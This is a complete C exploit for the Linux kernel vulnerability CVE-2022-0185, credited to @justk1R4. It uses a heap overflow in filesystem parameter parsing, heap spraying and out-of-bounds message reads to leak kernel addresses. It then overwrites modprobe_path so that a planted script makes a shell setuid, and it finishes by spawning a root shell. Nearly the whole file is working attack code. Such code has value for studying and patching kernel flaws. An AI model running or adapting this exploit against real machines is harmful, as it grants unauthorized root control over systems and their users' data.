/*
    CVE-2022-0185 Exploit by @justk1R4
*/

#include "exploit.h"

void setup_modprobe(char *trigger, char *hax)
{
    char haxcode[] = "#!/bin/sh\nchmod u+s " SHELL "\n";

    int tfd = open(trigger, O_RDWR | O_CREAT);
    if (tfd < 0)
        error("open");
    write(tfd, "\xff\xff\xff\xff", 4);
    close(tfd);

    int hfd = open(hax, O_RDWR | O_CREAT);
    if (hfd < 0)
        error("open");
    write(hfd, haxcode, sizeof(haxcode));
    close(hfd);

    chmod(trigger, 0777);
    chmod(hax, 0777);
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];
    unshare(CLONE_NEWNS | CLONE_NEWUSER);
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    int ret = mount("none", "/", NULL, MS_REC | MS_PRIVATE, NULL);
    if (ret < 0)
        error("mount");

    return;
}

void openfs(char *fs)
{
    dfd = fsopen(fs, 0x0);
    if (dfd < 0)
        error("fsopen");
    else
        return;
}

/*
    Create tmpfs to use simple_xattr objects
*/
void setup_tmpfs(void)
{
    system("umount /tmp/tmpfs 2>/dev/null");
    system("rm -r /tmp/tmpfs 2>/dev/null");
    system("mkdir /tmp/tmpfs");
    system("mount -t tmpfs -o size=50M none /tmp/tmpfs");
}

/*
    Sprays seq_operation objects in kmalloc-32
*/
void spray_seqops(int amt)
{
    for (int i = 0; i < amt; i++)
    {
        sfd[i] = open("/proc/self/stat", O_RDONLY);
        if (sfd[i] < 0)
            error("open");
    }
}

/*
    Clean up seq_operations sprayed in kmalloc-32
*/
void clean_seqops(int amt)
{
    for (int i = 0; i < amt; i++)
    {
        if (close(sfd[i]) < 0)
            error("close");
    }
}

/*
    Sprays msg_msg objects in kmalloc-4k
*/
void spray_msg(int amt)
{
    msg *ms = (msg *)&buffer;
    memset(buffer, 0x7f, sizeof(buffer));

    for (int i = 0; i < amt; i++)
    {
        qid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (qid[i] < 0)
            error("msgget");
        ms->mtype = i + 1;

        for (int j = 0; j < 4; j++)
        {
            if (msgsnd(qid[i], buffer, DATALEN_MSG, 0) < 0)
                error("msgnd");
        }
    }
}

/*
    Spray strings of "security.cccccccccccccc" in kmalloc-32
    which is later used to overwrite name pointer
    Also sprays simple_xattr objects on kmalloc-64
    which is used for heap leak
*/
void spray_str(int amt)
{
    char fname[0x40];

    for (int i = strctr; i < amt; i++)
    {
        snprintf(fname, sizeof(fname), "/tmp/tmpfs/x%d", i);

        if (creat(fname, 0666) < 0)
            error("creat");

        if (setxattr(fname, "security.cccccccccccccc", "A", 1, XATTR_CREATE) < 0)
            error("setxattr");

        strctr++;
    }
}

/*
    Trigger overflow in legacy_parse_param to overwrite size
    of msg_msg
*/
void overwrite_size(short size)
{
    openfs("ext3");
    char spam[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    char final[] = "BAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x00";
    memcpy(final + 23, &size, 2);

    for (int i = 0; i < 0x75; i++)
    {
        fsconfig(dfd, FSCONFIG_SET_STRING, "\x00", spam, 0);
    }
    fsconfig(dfd, FSCONFIG_SET_STRING, "\x00", final, 0);
    return;
}

/*
    Trigger overflow in legacy_parse_param to overwrite pointers
    of list member in simple_xattr
*/
void overwrite_ptr(void)
{
    u64 target = modprobe_path + 1;

    openfs("ext3");
    char spam[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    char final[0x30] = {0};

    // Set next pointer to 0xffxxxxxx2f706d74
    memcpy(final, &heap, 8);
    memcpy(final, "tmp/", 4);

    // Set prev pointer to modprobe_path+1
    memcpy(final + 8, &target, 8);

    // Set name to heap leak
    memcpy(final + 16, &secstr, 8);

    for (int i = 0; i < 0x75; i++)
    {
        fsconfig(dfd, FSCONFIG_SET_STRING, "\x00", spam, 0);
    }
    fsconfig(dfd, FSCONFIG_SET_STRING, final, "\x00", 0);
}

void calculate_offsets(void)
{
    modprobe_path = 0xffffffff82c6c2e0 - _TEXT + base;
}

void leak_base(void)
{
    int idx = 0;

    // Setup msg_msg (kmalloc-4k) and msg_msgseg (kmalloc-32)
    int msgqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    if (msgqid < 0)
        error("msgget");

    memset(buffer, 0x7f, sizeof(buffer));
    if (msgsnd(msgqid, buffer, DATALEN_MSG + 0x20, 0))
        error("msgsnd");

    // Try overwriting size of msg_msg
    overwrite_size(0x1060);

    // Try recieving code leaks from OOB read
    if (msgrcv(msgqid, leaks, 0x1060, 0, MSG_COPY | IPC_NOWAIT | MSG_NOERROR) < 0)
        error("msgrcv");

    if (leaks[0x202] > _TEXT)
        idx = 0x202;
    else if (leaks[0x206] > _TEXT)
        idx = 0x206;

    if (idx)
    {
        base = leaks[idx] - 0x3400b0;
        if (base & 0xfff)
        {
            base = 0;
            goto cleanup;
        }
        printf("[*] Base => %#lx\n", base);
        return;
    }

cleanup:
    // Cleanup and repeat
    msgrcv(msgqid, leaks, DATALEN_MSG + 0x20, 0, IPC_NOWAIT);
    return;
}

void leak_heap(void)
{
    int idx = 0;

    // Spray simple_xattrs (kmalloc-64) that are hopefully adjacent to the target msg_msgseg
    spray_str(0x8);

    // Setup msg_msg (kmalloc-4k) & msg_msgseg (kmalloc-64)
    int msgqid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    if (msgqid < 0)
        error("msgget");

    memset(buffer, 0x7f, sizeof(buffer));
    if (msgsnd(msgqid, buffer, DATALEN_MSG + 0x30, 0))
        error("msgsnd");

    // Try overwriting size of msg_msg
    overwrite_size(0x10c0);

    // Try recieving leaks from OOB read
    if (msgrcv(msgqid, leaks, 0x10c0, 0, MSG_COPY | IPC_NOWAIT | MSG_NOERROR) < 0)
        error("msgrcv");

    // Check if leak is valid
    for (int i = 0x204; i < 0x215; i++)
    {
        if (leaks[i] > HEAP_MIN && leaks[i] < _TEXT)
        {
            if (leaks[i + 2] != 0x41)
                continue;
            if (leaks[i - 1] != leaks[i - 2])
                continue;
            idx = i;
            break;
        }
    }

    // Bail out if leak is found
    if (idx)
    {
        secstr = leaks[idx];

        /*
            There isn't much memory before the heap leak so we assume that
            there is a lot af valid memory after the leak so that 
            0xffxxxxxx2f706d74 is a valid address
        */
        heap = leaks[idx] & ~0xfff;
        heap = heap + 0x100000000;

        printf("[*] Found str on heap => %#lx\n", secstr);
        printf("[*] Heap => %#lx\n", heap);
        return;
    }

    // Cleanup and repeat if not
    msgrcv(msgqid, leaks, DATALEN_MSG + 0x30, 0, IPC_NOWAIT);
    return;
}

void attack(void)
{
    // setxattr to create simple_xattr in kmalloc-4k
    memset(buffer, 0x49, sizeof(buffer));
    buffer[PAGE_SZ - 0x28 - 1] = 0;
    if (setxattr("/tmp/tmpfs/x", "security.a", buffer, PAGE_SZ - 0x38, XATTR_CREATE) < 0)
        error("setxattr");

    // Try to overwrite pointers in simple_xattr
    overwrite_ptr();

    // Try to trigger the unlink
    removexattr("/tmp/tmpfs/x", "security.cccccccccccccc");
}

void stage1_setup(void)
{
    // Occupy slots in kmalloc-4k
    // spray_msg(0x40);
    // Spray seq_operations with holes in between to fit victim msg_msgseg
    spray_seqops(0xc0);
    clean_seqops(0xc0);
    spray_seqops(0x40);
}

void stage2_setup(void)
{
    memset(leaks, 0x0, sizeof(leaks));

    // Cleanup seq_operations previously sprayed
    clean_seqops(0x40);
    // Spray simple_xattrs in kmalloc-64 with name pointer in kmalloc-32
    spray_str(0x80);
}

void stage3_setup(void)
{
    // 8 bytes from modprobe_path+1 will be overwritten to 0xffxxxxxx2f706d74 which is valid memory
    // This particular value is chosen since its dereferenced during unlinking in simple_xattr_set()
    // Effective this happens, "/sbin/modprobe" => "/tmp/XXXXprobe" (0x2f706d74 is "tmp/")
    // So we copy the upper 4 bytes of heap to our target path
    memcpy(modprobe_target + 5, (char *)&heap + 4, 4);

    // Create file on which setxattr will be used
    if (creat("/tmp/tmpfs/x", 0666) < 0)
        error("creat");

    // Setup files for modprobe shenanigans & calculate modprobe_path address
    setup_modprobe(MDPRB_TRIGGER, modprobe_target);
    calculate_offsets();

    // Spray msg_msg objects in kmalloc-4k for increasing reliability
    spray_msg(0x30);
}

int main()
{
    // Pin to CPU0
    setaff(0);

    // Pipes to communicate between threads
    if (pipe(pipes) < 0)
        error("pipes");

    // Wait for parent to complete exploit
    if (!fork())
    {
        read(pipes[0], leaks, 1);
        puts("[#] We are ROOT!");
        system("" SHELL " -p");
        sleep(0x1000000);
    }

    // Switch namespace to be able to use fsopen & setxattr
    unshare_setup(getuid(), getgid());
    // Setup a tmpfs to abuse simple_xattr
    setup_tmpfs();

    /*
        Stage 1
        Overwrite size field of msg_msg in kmalloc-4k with overflow
        Corresponding msg_msg has msg_msgseg in kmalloc-32
        Use OOB read with msgrcv to get code leak from neighboring seq_operation objects
    */
    success("Stage 1: Kernel base leak");
    stage1_setup();
    while (1)
    {
        leak_base();
        if (base >= _TEXT)
            break;
    }
    putchar('\n');

    /*
        Stage 2
        Similarly setup msg_msg with corresponding msg_msgseg in kmalloc-64
        Use OOB read to get name pointer leak which is to be used later
    */
    success("Stage 2: Heap leak (kmalloc-32)");
    stage2_setup();
    while (1)
    {
        leak_heap();
        if (heap >= HEAP_MIN)
            break;
    }
    putchar('\n');

    getchar();
    /*
        Stage 3
        Overwrite pointers in list member of simple_xattr in kmalloc-4k with overflow
        Set list->next = 0xffxxxxxx2f706d74 & list->prev = modprobe_path+1
        When unlinking occurs during removexattr, modprobe_path is overwritten to "/tmp/XXXXprobe"
        No panic occurs during unlinking as 0xffxxxxxx2f706d74 is valid memory calculated using heap leak
    */
    success("Stage 3: Attack!");
    stage3_setup();
    while (1)
    {
        struct stat st;

        // Run the attack and trigger usermode helper with magic file
        attack();
        system("" MDPRB_TRIGGER " 2>/dev/null");

        // Check if attack was successful
        if (stat(SHELL, &st) < 0)
            error("stat");
        if (st.st_mode & S_ISUID)
            break;
        else
            removexattr("/tmp/tmpfs/x", "security.a");
    }

    // Trigger child to pop root shell
    write(pipes[1], leaks, 1);
    sleep(0x1000000);
    return 0;
}